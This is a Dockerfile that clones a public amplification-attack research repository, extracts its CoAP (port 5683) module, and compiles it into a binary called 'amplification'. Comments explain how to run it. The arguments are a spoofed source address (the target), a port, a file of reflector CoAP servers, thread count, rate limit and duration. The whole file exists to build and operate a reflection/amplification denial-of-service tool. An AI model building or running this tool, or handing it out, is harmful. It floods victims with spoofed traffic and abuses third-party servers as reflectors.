FROM ubuntu:focal

RUN apt update && DEBIAN_FRONTEND=noninteractive apt install -y \
    git \
    gcc \
    && rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/Phenomite/AMP-Research.git

WORKDIR /opt

RUN cp -r '/AMP-Research/Port 5683 - CoAP' coap &&\
    rm -r /AMP-Research

RUN cd ./coap &&\
    gcc -pthread -O2 -o amplification coap.c &&\
    touch serverlist.txt

#                           | serverlist.txt addresses of coap servers (newline separated)
#                           v
# ./amplification host port listfile threads limit[-1 for none] time
#                 ^
#                 | spoofed address
#                 | (source address)

CMD ["/bin/bash"]
